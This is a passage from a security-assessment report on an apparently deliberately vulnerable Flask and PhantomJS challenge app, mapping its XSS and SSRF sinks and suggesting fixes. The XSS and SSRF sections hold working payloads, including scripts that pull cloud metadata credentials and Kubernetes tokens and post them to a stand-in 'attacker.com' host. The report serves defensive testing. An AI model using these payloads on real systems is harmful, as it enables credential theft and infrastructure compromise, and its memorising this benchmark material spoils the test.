...will find zero instances. The only security-relevant code is the **negative example** of the weak regex filter at line 66, which provides a false sense of security while being trivially bypassable. This creates a documentation burden for security assessors, as they must explicitly document the **absence** of controls rather than analyzing the **configuration** of controls.

**Import Dependency Analysis:**

The application imports only Flask framework components and Python standard library modules, with no third-party security libraries:

```python
# app.py lines 1-3
from flask import Flask, request, Response, make_response, url_for
import os, subprocess, sys, re
```

Notably absent:
- No `flask_login` (authentication)
- No `flask_principal` or `flask_security` (authorization)
- No `flask_limiter` (rate limiting)
- No `flask_cors` (CORS protection)
- No `cryptography` or `pycryptodome` (encryption)
- No `bleach` or `html5lib` (HTML sanitization)
- No `oauthlib` or `authlib` (OAuth/OIDC)

This minimalist dependency approach reduces supply chain attack surface but eliminates all security-focused libraries that would prevent the very vulnerabilities the challenge exposes.

**Impact on Penetration Testing:**

The flat structure and minimal codebase mean penetration testers can quickly map the entire application attack surface in Phase 1 reconnaissance, but the tight coupling of vulnerabilities across file boundaries requires careful data flow tracing. The absence of configuration files for security controls (no `security.yml`, no middleware configuration files) means testers must assume default-deny postures—if a control isn't explicitly implemented in code, it doesn't exist. The Docker-based deployment model concentrates all security analysis into reviewing the `Dockerfile` (45 lines) and `docker-compose.yml` (10 lines), making infrastructure security assessment straightforward but revealing critical misconfigurations like the `OPENSSL_CONF=/dev/null` directive that disables TLS entirely.

## 8. Critical File Paths

Below is a categorized list of all security-relevant file paths identified during the comprehensive code analysis:

### Configuration
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/.env` - **CRITICAL**: Flag secret committed to version control
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/docker-compose.yml` - Container orchestration, port exposure (34545)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/Dockerfile` - Build configuration with security misconfigurations (TLS disabled, root user)

### Authentication & Authorization
- **NONE** - Application implements zero authentication or authorization controls

### API & Routing
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:29-31` - `GET /` route (index page)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:63-71` - `GET /page` route (XSS challenge endpoint, **CRITICAL VULNERABILITY**)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:75` - Flask application run configuration (debug mode enabled)

### Data Models & DB Interaction
- **NONE** - No database layer implemented
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/secret.txt` - Plaintext flag storage (created at Docker build time)

### Dependency Manifests
- **NONE** - No `requirements.txt`, `pyproject.toml`, or `Pipfile` (dependencies hardcoded in Dockerfile)

### Sensitive Data & Secrets Handling
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/.env:1` - **CRITICAL**: Plaintext flag in environment file (git tracked)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/secret.txt:1` - Plaintext flag storage
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:22` - Secret loading logic (`flags = open('secret.txt').read().split()`)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/Dockerfile:21-23` - Docker ARG secret injection via `sed`

### Middleware & Input Validation
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:66` - Weak XSS filter regex (`re.sub(r"""["']XSS["']""", "", msg)`)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:67` - Unsafe HTML attribute injection (`value="{0}".format(msg)`)

### Logging & Monitoring
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:41-47` - Debug print statements (potential secret disclosure in logs)

### Infrastructure & Deployment
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/Dockerfile:8` - **CRITICAL**: TLS disabled (`ENV OPENSSL_CONF=/dev/null`)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/Dockerfile:12` - PhantomJS binary installation (abandoned software with 72+ CVEs)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/docker-compose.yml:6` - Port binding configuration (`ports: 34545:34545`)

### XSS Vulnerability Locations
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:67` - **CRITICAL XSS SINK**: HTML attribute injection in `value="{0}".format(msg)`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/constants.py:165` - HTML template with placeholder `{2}` receiving unsanitized user input
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:35` - Temporary HTML file creation in static directory (race condition risk)

### SSRF Vulnerability Locations
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/check.js:4` - User-controlled input read from stdin
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/check.js:20` - **CRITICAL SSRF SINK**: `page.open(input)` with unvalidated user input
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:34-43` - PhantomJS subprocess spawning with user-controlled URL
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:43` - URL passed to PhantomJS stdin (`proc.stdin.write(url)`)

### HTML Templates
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/constants.py:8-149` - INDEX page template (static, safe)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/constants.py:151-177` - PAGE_CONTENT template (contains XSS vulnerability)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/constants.py:179-209` - PAGE_CONTENT_IFRAME template (unused, potential client-side SSRF if implemented)

### PhantomJS Validation Script
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/check.js:20` - SSRF sink in `page.open()` call
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/check.js:23-35` - XSS detection logic (checks for `alert()`, `confirm()`, `prompt()`)

## 9. XSS Sinks and Render Contexts

This section documents all Cross-Site Scripting (XSS) vulnerability sinks identified in the network-accessible attack surface of the XBEN-017-24 application. Analysis is limited to components reachable via HTTP requests to the running Flask application and excludes local-only scripts, build tools, and non-web interfaces.

### CRITICAL XSS VULNERABILITY - XSS-001

**Vulnerability Classification:** Reflected XSS (CWE-79)  
**Severity:** CRITICAL (CVSS 8.2)  
**Render Context:** HTML Attribute Context (Input Element Value)

#### Vulnerability Location

**Primary Sink:**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py`
- **Line:** 67
- **Code:**
  ```python
  value = "" if msg == "" else 'value="{0}"'.format(msg)
  ```
- **Endpoint:** `GET /page`
- **Parameter:** `name` (query parameter)

**Unsafe String Formatting:**
```python
# Line 65: User input acquisition
msg = request.args.get('name','')

# Line 66: WEAK FILTER - Only removes literal ["']XSS["'] strings
msg = re.sub(r"""["']XSS["']""", "", msg, flags=re.IGNORECASE)

# Line 67: SINK - Unsafe formatting into HTML attribute
value = "" if msg == "" else 'value="{0}"'.format(msg)

# Line 69: Injection into template
page = constants.PAGE_CONTENT.format(constants.STYLE, fn, value)
```

**Template Injection Point:**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/constants.py`
- **Line:** 165
- **Code:**
  ```html
  <input type=text name=name placeholder="Enter your name..." {2}>
  ```
- **Placeholder `{2}` receives unsanitized user input from line 67 of app.py**

#### Render Context Analysis

**HTML Attribute Context (Value Attribute):**

The user input is rendered inside an HTML `<input>` tag's `value` attribute:
```html
<input type=text name=name placeholder="Enter your name..." value="USER_INPUT_HERE">
```

**Why This Context is Dangerous:**
1. **Quote Escaping Bypass:** Attacker can close the `value` attribute with `"` and inject new attributes
2. **Event Handler Injection:** New event handler attributes (`onclick`, `onerror`, `onload`, etc.) execute JavaScript
3. **Tag Breakout:** Attacker can close the `<input>` tag entirely with `>` and inject arbitrary HTML/JavaScript
4. **No Auto-Escaping:** Python `.format()` performs no HTML entity encoding (unlike Jinja2 auto-escaping)

**Required Sanitization (NOT IMPLEMENTED):**
- HTML entity encoding of special characters: `" → &quot;`, `< → &lt;`, `> → &gt;`, `' → &#x27;`
- Context-aware output encoding for attribute values
- Content Security Policy headers to restrict inline script execution
- Use of Jinja2 templates with auto-escaping enabled

#### Exploitation Proof-of-Concepts

**Attack 1: Event Handler Injection (onclick)**
```
URL: http://localhost:34545/page?name=" onclick="alert(document.domain)" x="

Rendered HTML:
<input type=text name=name placeholder="Enter your name..." value="" onclick="alert(document.domain)" x="">

Result: JavaScript executes when user clicks the input field
```

**Attack 2: Tag Breakout with Script Injection**
```
URL: http://localhost:34545/page?name="><script>alert(1)</script><input "

Rendered HTML:
<input type=text name=name placeholder="Enter your name..." value=""><script>alert(1)</script><input "">

Result: Script tag executes immediately on page load
```

**Attack 3: SVG with Auto-Execute Onload**
```
URL: http://localhost:34545/page?name="><svg/onload=alert(1)>

Rendered HTML:
<input type=text name=name placeholder="Enter your name..." value=""><svg/onload=alert(1)>

Result: SVG onload handler executes immediately without user interaction
```

**Attack 4: Autofocus with Onfocus Handler**
```
URL: http://localhost:34545/page?name=" onfocus="alert(1)" autofocus="

Rendered HTML:
<input type=text name=name placeholder="Enter your name..." value="" onfocus="alert(1)" autofocus="">

Result: Autofocus attribute automatically triggers onfocus event handler
```

**Attack 5: Image with Onerror Handler**
```
URL: http://localhost:34545/page?name="><img src=x onerror=alert(1)>

Rendered HTML:
<input type=text name=name placeholder="Enter your name..." value=""><img src=x onerror=alert(1)>

Result: Invalid image source triggers onerror handler immediately
```

#### Input Validation Bypass Analysis

**Current Filter Implementation:**
```python
# Line 66: app.py
msg = re.sub(r"""["']XSS["']""", "", msg, flags=re.IGNORECASE)
```

**Filter Logic:**
- Removes only exact strings: `"XSS"`, `'XSS'`, `"xss"`, `'xss'` (case-insensitive)
- **Does NOT remove:** `xss` without quotes, `<script>`, event handlers, HTML tags, JavaScript functions

**Trivial Bypasses:**
1. **Omit quotes:** `xss` (not filtered)
2. **Alternative payloads:** `<script>alert(1)</script>` (no "XSS" string present)
3. **Event handlers:** `onclick=alert(1)` (no "XSS" string present)
4. **Encoding:** `&#x78;ss` (HTML entity encoding)
5. **Case variation:** `xSs` (filtered, but only when wrapped in quotes)

**Filter Effectiveness Rating:** 0.1/10 (provides virtually no protection)

#### Data Flow Diagram

```
1. Attacker sends HTTP GET request
   ↓
   URL: http://localhost:34545/page?name="><script>alert(1)</script>
   ↓
2. Flask routing (app.py:63)
   @app.route('/page')
   ↓
3. User input extraction (app.py:65)
   msg = request.args.get('name','')
   value: "><script>alert(1)</script>
   ↓
4. Weak regex filter (app.py:66)
   msg = re.sub(r"""["']XSS["']""", "", msg)
   value: "><script>alert(1)</script> (unchanged - no "XSS" string detected)
   ↓
5. Unsafe formatting (app.py:67)
   value = 'value="{0}"'.format(msg)
   value: value=""><script>alert(1)</script>"
   ↓
6. Template injection (app.py:69)
   page = constants.PAGE_CONTENT.format(..., value, ...)
   Injects into: <input ... {2}>
   ↓
7. HTTP response sent to browser
   ↓
8. Browser renders malicious HTML
   <input type=text name=name placeholder="Enter your name..." value=""><script>alert(1)</script>">
   ↓
9. JavaScript executes in victim's browser context
   alert(1) displays popup
   ↓
10. Attacker gains JavaScript execution capability
    Can steal cookies, access localStorage, make API calls as victim, redirect to phishing sites
```

#### Impact Assessment

**Confidentiality: HIGH**
- Attacker can read all cookies (if HttpOnly not set - application has no cookies, but principle applies)
- Access to localStorage and sessionStorage
- Reading CSRF tokens or sensitive page content

**Integrity: HIGH**
- Modify page content to display phishing forms
- Deface the application
- Modify application behavior via DOM manipulation

**Availability: LOW**
- Can redirect users to attacker-controlled sites
- Limited DoS potential through infinite loops

**Scope: CHANGED**
- XSS in PhantomJS context enables SSRF attacks (server-side JavaScript execution)
- Can pivot from client-side XSS to server-side request forgery

### XSS Categories with NO FINDINGS

The following XSS sink categories were analyzed and found **NOT PRESENT** in network-accessible components:

#### ✓ HTML Body Context Sinks - NONE FOUND
- **innerHTML assignments:** No `element.innerHTML = userInput` patterns
- **outerHTML assignments:** No `element.outerHTML = userInput` patterns
- **document.write():** No dynamic `document.write()` calls (only static in constants.py templates)
- **document.writeln():** Not present
- **insertAdjacentHTML():** Not present
- **Range.createContextualFragment():** Not present
- **jQuery DOM sinks:** No jQuery library usage (.html(), .append(), .after(), .before(), .prepend(), .replaceWith(), .wrap())

#### ✓ JavaScript Context Sinks - NONE FOUND
- **eval() with user input:** No `eval()` calls in Python or JavaScript code
- **Function() constructor:** Not present
- **setTimeout() with string:** Not present (PhantomJS uses function callbacks, not strings)
- **setInterval() with string:** Not present
- **Script tag injection:** XSS vulnerability enables this, but no server-side template directly injects into `<script>` tags

#### ✓ CSS Context Sinks - NONE FOUND
- **element.style assignments:** No dynamic CSS property manipulation
- **<style> tag injection:** No user input reflected into CSS contexts

#### ✓ URL Context Sinks - NONE FOUND
- **location / window.location:** No client-side redirects based on user input
- **location.href / replace() / assign():** Not present
- **window.open():** Not present
- **history.pushState() / replaceState():** Not present
- **URL.createObjectURL():** Not present

#### ✓ SQL Injection Sinks - NONE FOUND
- **No database layer:** Application uses no SQL or NoSQL databases
- **No query construction:** No string concatenation in queries, no ORM usage

#### ✓ Command Injection Sinks - LIMITED EXPOSURE
- **subprocess.Popen():** Present at app.py:34, but uses **array-based arguments** (safe from shell injection)
- **Code:**
  ```python
  proc = subprocess.Popen(
      ['/usr/local/bin/phantomjs', '--ssl-protocol=any', '/app/src/check.js'],
      stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
  )
  ```
- **Assessment:** Arguments are hardcoded, not user-controlled. User input only affects stdin content (URL), which leads to SSRF, not command injection.

#### ✓ Template Injection Sinks - NONE FOUND (SSTI)
- **Jinja2/Mako/Django templates:** Not used (application uses Python `.format()` strings)
- **Server-Side Template Injection:** Not exploitable - `.format()` uses positional placeholders `{0}`, `{1}`, `{2}`, not expression evaluation

### Temporary File Race Condition (Secondary XSS Risk)

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:35`

**Code:**
```python
# Line 35: Create temporary HTML file with user content
fn = "static/" + os.urandom(16).encode('hex') + '.html'

# Line 36-38: Write user-generated HTML to file
with open(fn, "w") as f:
    f.write(page)

# Lines 39-54: PhantomJS validation

# Line 55: File deletion
os.remove(fn)
```

**Race Condition Window:**
Between file creation (line 38) and deletion (line 55), the temporary HTML file is accessible via:
```
http://localhost:34545/static/<random_hex>.html
```

**Exploitation Difficulty:** HIGH
- Attacker must guess 128-bit random hex filename (2^128 possibilities)
- Window is ~5 seconds (PhantomJS timeout)
- Flask development server is single-threaded (no concurrent requests)

**Impact if Exploited:**
- Attacker can retrieve HTML page containing their XSS payload
- Potential flag disclosure if XSS challenge solved and flag rendered in HTML

**Assessment:** Theoretical risk only, not practically exploitable due to cryptographic randomness of filename.

### Summary Table

| Sink ID | Type | Location | Render Context | Severity | Exploitability |
|---------|------|----------|----------------|----------|----------------|
| XSS-001 | Reflected XSS | app.py:67 | HTML Attribute (value) | CRITICAL | Trivial |
| XSS-002 | Stored XSS (temp file) | app.py:35-55 | HTML Body | MEDIUM | Very Difficult (race condition) |

**Total XSS Sinks Found:** 1 critical, 1 theoretical (race condition)

**Recommended Remediation Priority:**
1. **IMMEDIATE:** Implement HTML entity encoding for all user input in HTML contexts
2. **IMMEDIATE:** Replace Python `.format()` with Jinja2 templates with auto-escaping enabled
3. **HIGH:** Implement Content Security Policy headers to block inline scripts
4. **MEDIUM:** Store temporary files outside web-accessible directory (use `/tmp` instead of `static/`)

## 10. SSRF Sinks

This section documents all Server-Side Request Forgery (SSRF) vulnerability sinks identified in the network-accessible attack surface of the XBEN-017-24 application. Analysis is limited to components reachable via HTTP requests to the running Flask application and excludes local-only utilities, build scripts, developer tools, or CLI applications.

### CRITICAL SSRF VULNERABILITY - SSRF-001

**Vulnerability Classification:** Server-Side Request Forgery via Headless Browser (CWE-918)  
**Severity:** CRITICAL (CVSS 9.3)  
**Attack Vector:** Network, Unauthenticated, Low Complexity

#### Vulnerability Location

**Primary Sink:**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/check.js`
- **Line:** 20
- **Code:**
  ```javascript
  var input = system.stdin.readLine();  // Line 4: User-controlled input
  page.open(input, function(status) {   // Line 20: SSRF SINK - Unvalidated navigation
      // ...
  });
  ```

**Subprocess Invocation:**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py`
- **Lines:** 34-43
- **Code:**
  ```python
  # Line 34: Spawn PhantomJS process
  proc = subprocess.Popen(
      ['/usr/local/bin/phantomjs', '--ssl-protocol=any', '/app/src/check.js'],
      stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
  )
  
  # Line 43: Send URL containing user input to PhantomJS stdin
  proc.stdin.write(url)  # url = 'http://localhost:34545/static/<random>.html'
  proc.stdin.close()
  ```

**User Input Path:**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py`
- **Lines:** 65-69
- **Code:**
  ```python
  # Line 65: Extract user input from query parameter
  msg = request.args.get('name','')
  
  # Line 66: Minimal filtering (removes only ["']XSS["'])
  msg = re.sub(r"""["']XSS["']""", "", msg, flags=re.IGNORECASE)
  
  # Line 67-69: User input embedded in HTML page
  value = "" if msg == "" else 'value="{0}"'.format(msg)
  page = constants.PAGE_CONTENT.format(constants.STYLE, fn, value)
  
  # Line 36-38: HTML written to temporary file
  with open(fn, "w") as f:
      f.write(page)
  
  # Line 40: URL constructed pointing to temporary file
  url = 'http://localhost:34545/static/' + fn.split('/')[-1]
  ```

#### SSRF Attack Chain

```
1. External Attacker
   ↓
   Sends HTTP GET request: /page?name=<script>fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')</script>
   ↓
2. Flask Endpoint (app.py:63-71)
   ↓
   Extracts parameter: msg = "<script>fetch('http://169.254.169.254/...')</script>"
   ↓
   Weak filter check: No match for ["']XSS["'], input passes through unchanged
   ↓
   Embeds in HTML template: <input ... value="<script>fetch('http://169.254.169.254/...')</script>">
   ↓
3. Temporary File Creation (app.py:35-38)
   ↓
   Writes HTML to: static/3a5f9c2b1d4e8f7a.html (random name)
   ↓
4. PhantomJS Subprocess (app.py:34-43)
   ↓
   Spawns: /usr/local/bin/phantomjs --ssl-protocol=any /app/src/check.js
   ↓
   Sends URL via stdin: http://localhost:34545/static/3a5f9c2b1d4e8f7a.html
   ↓
5. PhantomJS Navigation (check.js:20)
   ↓
   page.open('http://localhost:34545/static/3a5f9c2b1d4e8f7a.html')
   ↓
   PhantomJS renders HTML page
   ↓
   JavaScript executes: fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
   ↓
6. Server-Side Request Forgery
   ↓
   PhantomJS makes HTTP request to AWS metadata service from server's network context
   ↓
   Response: {"Code":"Success","LastUpdated":"...","Type":"AWS-HMAC","AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
   ↓
7. Data Exfiltration
   ↓
   JavaScript sends stolen credentials to attacker: fetch('http://attacker.com/leak', {method: 'POST', body: credentials})
   ↓
8. Infrastructure Compromise
   ↓
   Attacker uses IAM credentials to access AWS resources (S3 buckets, EC2 instances, RDS databases, etc.)
```

#### Exploitation Proof-of-Concepts

**Attack 1: AWS Metadata Service Access (IAM Credentials)**
```
URL: http://localhost:34545/page?name=<script>fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/').then(r=>r.text()).then(role=>fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role).then(r=>r.text()).then(creds=>fetch('http://attacker.com/leak',{method:'POST',body:creds})))</script>

Attack Flow:
1. Fetch IAM role name from metadata service
2. Fetch IAM credentials for that role
3. Exfiltrate credentials to attacker-controlled server

Impact: Full AWS account compromise via stolen temporary credentials
```

**Attack 2: Internal Network Scanning**
```
URL: http://localhost:34545/page?name=<script>fetch('http://internal-api.local:8080/admin').then(r=>r.text()).then(d=>fetch('http://attacker.com/leak',{method:'POST',body:d}))</script>

Attack Flow:
1. Access internal API endpoint not exposed to internet
2. Exfiltrate API response to attacker

Impact: Access to internal services, potential privilege escalation
```

**Attack 3: Localhost Service Probing (Redis)**
```
URL: http://localhost:34545/page?name=<img src="http://127.0.0.1:6379/INFO">

Attack Flow:
1. PhantomJS attempts to load image from Redis port
2. Connection success/failure indicates service presence
3. Timing differences reveal open ports

Impact: Internal port scanning, service discovery
```

**Attack 4: GCP Metadata Service Access**
```
URL: http://localhost:34545/page?name=<script>fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',{headers:{'Metadata-Flavor':'Google'}}).then(r=>r.text()).then(t=>fetch('http://attacker.com/leak',{method:'POST',body:t}))</script>

Attack Flow:
1. Fetch GCP service account OAuth token
2. Exfiltrate token to attacker

Impact: GCP resource access (Cloud Storage, BigQuery, Compute Engine)
```

**Attack 5: Azure Metadata Service Access**
```
URL: http://localhost:34545/page?name=<script>fetch('http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',{headers:{'Metadata':'true'}}).then(r=>r.text()).then(t=>fetch('http://attacker.com/leak',{method:'POST',body:t}))</script>

Attack Flow:
1. Fetch Azure managed identity OAuth token
2. Exfiltrate token to attacker

Impact: Azure Resource Manager access (VMs, databases, Key Vault)
```

**Attack 6: Kubernetes Service Account Token Theft**
```
URL: http://localhost:34545/page?name=<script>fetch('file:///var/run/secrets/kubernetes.io/serviceaccount/token').then(r=>r.text()).then(t=>fetch('http://attacker.com/leak',{method:'POST',body:t}))</script>

Attack Flow:
1. Read Kubernetes service account token from filesystem
2. Exfiltrate token to attacker

Impact: Kubernetes API access, potential cluster-wide compromise
```

**Attack 7: Internal DNS Rebinding (Time-of-Check-Time-of-Use)**
```
URL: http://localhost:34545/page?name=<script>fetch('http://evil.attacker.com/rebind').then(r=>r.text()).then(d=>fetch('http://attacker.com/leak',{method:'POST',body:d}))</script>

Attack Flow:
1. evil.attacker.com initially resolves to public IP (passes allowlist checks if implemented)
2. DNS TTL expires, evil.attacker.com resolves to 169.254.169.254 or internal IP
3. PhantomJS makes second request to newly resolved internal IP

Impact: Bypass IP-based allowlists, access internal resources
```

#### Impact Assessment

**Confidentiality: HIGH**
- Access to cloud metadata services (AWS, GCP, Azure) exposes IAM credentials, service account tokens, and API keys
- Internal network reconnaissance reveals service topology and potential attack targets
- Kubernetes secrets and config maps accessible if deployed in containerized environment
- Database connection strings, internal API keys, and other infrastructure secrets

**Integrity: MEDIUM**
- POST requests via JavaScript `fetch()` enable modification of internal services
- Potential to trigger state changes in internal APIs (user creation, permission modification, configuration changes)
- Limited by 5-second timeout (app.py:46) preventing long-running destructive operations

**Availability: LOW**
- Timeout prevents sustained denial-of-service attacks
- Could trigger rate limiting on internal services through repeated requests
- Potential to exhaust resources if many concurrent SSRF attempts spawn multiple PhantomJS processes

**Scope: CHANGED**
- Vulnerability in web application enables access to resources beyond the application's intended scope
- Breaks network segmentation between application tier and internal services
- Compromises isolation between containerized workloads in Kubernetes/Docker environments
- Potential lateral movement from application compromise to infrastructure-level access

**Business Impact:**
- **Cloud Infrastructure Compromise:** Stolen IAM credentials enable full AWS/GCP/Azure account takeover
- **Data Breach:** Access to internal databases and APIs exposes sensitive customer data
- **Compliance Violations:** PCI-DSS, HIPAA, SOC 2 failures due to unauthorized access to cardholder data environments
- **Supply Chain Attacks:** If application has network access to third-party vendor APIs, attacker can compromise vendor integrations
- **Reputational Damage:** Public disclosure of cloud credential theft incident

#### Root Cause Analysis

**1. Unvalidated URL Navigation:**
```javascript
// check.js:20 - NO validation before navigation
page.open(input, function(status) {
```

**Missing Controls:**
- No URL scheme validation (should restrict to http://localhost:34545/static/*)
- No hostname validation
- No IP address allowlist/blocklist
- No check for private IP ranges (RFC 1918, 169.254.0.0/16, etc.)

**2. User-Controlled HTML Content:**
```python
# app.py:67-69 - User input directly embedded in HTML
value = "" if msg == "" else 'value="{0}"'.format(msg)
page = constants.PAGE_CONTENT.format(constants.STYLE, fn, value)
```

**Missing Controls:**
- No Content Security Policy to prevent inline scripts
- No HTML sanitization (allows `<script>` tags)
- No JavaScript sandboxing in PhantomJS

**3. Weak Input Filtering:**
```python
# app.py:66 - Regex filter only removes ["']XSS["']
msg = re.sub(r"""["']XSS["']""", "", msg, flags=re.IGNORECASE)
```

**Bypasses:**
- Any payload without quoted "XSS" string passes through
- Filter targets XSS keywords, not SSRF attack patterns

**4. Abandoned Browser with Known Vulnerabilities:**
PhantomJS 2.1.1 (March 2018) has 72+ known CVEs with no security patches, including:
- CVE-2019-17221: Arbitrary file read
- CVE-2019-8676: Memory corruption
- CVE-2018-6121: Cross-origin information leak

#### Recommended Remediation

**CRITICAL Priority (Implement Immediately):**

1. **URL Validation Allowlist:**
```python
# app.py - Add before line 43
import urllib.parse

parsed = urllib.parse.urlparse(url)
if parsed.hostname != 'localhost' or not parsed.path.startswith('/static/'):
    raise ValueError("Invalid URL for PhantomJS navigation")
```

2. **Network Segmentation - Block Metadata Services:**
```dockerfile
# Dockerfile - Add firewall rules
RUN iptables -A OUTPUT -d 169.254.169.254 -j REJECT
RUN iptables -A OUTPUT -d 169.254.0.0/16 -j REJECT
```

3. **Replace PhantomJS with Sandboxed Modern Browser:**
```python
# Use Playwright with restricted context
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(args=['--disable-web-security=false', '--no-sandbox'])
    context = browser.new_context(
        java_script_enabled=True,
        bypass_csp=False,  # Enforce CSP
    )
    # Configure network interception to block private IPs
```

4. **Content Security Policy:**
```python
# app.py - Add CSP header to prevent inline scripts
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'none'"
    return response
```

**HIGH Priority:**

5. **HTML Sanitization:**
```python
# Install: pip install bleach
import bleach

msg = bleach.clean(msg, tags=[], attributes={}, strip=True)
```

6. **Egress Proxy with Allowlisting:**
Configure PhantomJS to use HTTP proxy that blocks private IP ranges and cloud metadata endpoints.

7. **Container Network Policies:**
```yaml
# kubernetes-network-policy.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-metadata-egress
spec:
  podSelector:
    matchLabels:
      app: dalgona-challenges
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 169.254.169.254/32  # Block AWS metadata
        - 10.0.0.0/8          # Block private networks
        - 172.16.0.0/12
        - 192.168.0.0/16
```

### SSRF Categories with NO ADDITIONAL FINDINGS

The following SSRF sink categories were analyzed and found **NOT PRESENT** in network-accessible components beyond SSRF-001:

#### ✓ HTTP(S) Clients - NONE FOUND
- **requests library:** Not imported, not used
- **urllib/urllib2/urllib3:** Imported but never used for user-controlled requests
- **httplib:** Not present

#### ✓ Raw Sockets & Connect APIs - NONE FOUND
- **socket.connect():** Not present in Python or JavaScript code
- **Network sockets:** Only used internally by Flask for HTTP server, not user-controlled

#### ✓ URL Openers & File Includes - NONE FOUND
- **file_get_contents:** Not applicable (Python, not PHP)
- **urllib.urlopen:** Not used with user input
- **File operations:** Only `open('secret.txt')` (hardcoded path)

#### ✓ Redirect & "Next URL" Handlers - NONE FOUND
- **Flask redirect():** Not used anywhere in codebase
- **Location headers:** Not set dynamically
- **return_url / next parameters:** Not implemented

#### ✓ Headless Browsers - PHANTOMJS FOUND (REPORTED AS SSRF-001)
- **PhantomJS:** Present and vulnerable (reported above)
- **Puppeteer:** Not present
- **Selenium:** Not present
- **Playwright:** Not present

#### ✓ Media Processors - NONE FOUND
- **ImageMagick:** Not present
- **GraphicsMagick:** Not present
- **FFmpeg:** Not present
- **wkhtmltopdf:** Not present

#### ✓ Link Preview & Unfurlers - NONE FOUND
- **oEmbed fetchers:** Not present
- **URL metadata extractors:** Not present
- **Social media card generators:** Not present

#### ✓ Webhook Testers & Callback Verifiers - NONE FOUND
- **Webhook ping functionality:** Not present
- **Callback URL verification:** Not present

#### ✓ SSO/OIDC Discovery & JWKS Fetchers - NONE FOUND
- **OpenID Connect discovery:** Not present
- **JWKS fetching:** Not present
- **OAuth metadata:** Not present

#### ✓ Importers & Data Loaders - NONE FOUND
- **"Import from URL":** Not present
- **CSV/JSON remote loaders:** Not present
- **RSS feed readers:** Not present

#### ✓ Package/Plugin/Theme Installers - NONE FOUND
- **Remote package installation:** Not present

#### ✓ Monitoring & Health Check Frameworks - NONE FOUND
- **URL pingers:** Not present
- **Health check endpoints:** Not present

#### ✓ Cloud Metadata Helpers - NONE FOUND
- **Direct metadata API calls:** Not present (exploitation happens via JavaScript in PhantomJS, not server-side Python code)

### Unused Template with Potential Client-Side SSRF (Out of Scope)

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/constants.py:179-209`

**Template:** `PAGE_CONTENT_IFRAME`

**Code:**
```python
PAGE_CONTENT_IFRAME = """
<iframe src="{2}" style="width: 100%; height: 500px;"></iframe>
"""
```

**Analysis:**
- This template accepts a `url` parameter for iframe embedding (placeholder `{2}`)
- **NOT CURRENTLY USED:** No Flask route uses this template
- **Would create client-side SSRF (not server-side):** If implemented, attacker could frame internal resources, but requests originate from victim's browser, not the server
- **Impact if Implemented:** Clickjacking, internal resource framing, but NOT server-side request forgery

**Status:** Out of scope for this SSRF analysis (template never invoked by any network-accessible endpoint)

### Summary Table

| Sink ID | Type | Location | User Input Control | Severity | Exploitability |
|---------|------|----------|-------------------|----------|----------------|
| SSRF-001 | PhantomJS Navigation | check.js:20, app.py:34-43 | Full (JavaScript injection) | CRITICAL | Trivial |

